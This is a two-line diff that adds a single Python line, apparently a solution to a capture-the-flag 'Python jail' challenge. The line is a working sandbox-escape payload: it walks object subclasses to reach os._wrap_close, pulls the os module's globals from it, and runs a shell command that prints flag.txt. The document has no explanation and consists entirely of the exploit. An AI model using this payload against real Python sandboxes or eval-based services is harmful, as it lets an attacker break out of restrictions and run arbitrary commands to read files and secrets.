@@ -1,0 +1,2 @@
+os = [x.__init__.__globals__ for x in ''.__class__.__mro__[1].__subclasses__() if x.__name__ == '_wrap_close'][0];os['system']("cat flag.txt");
+
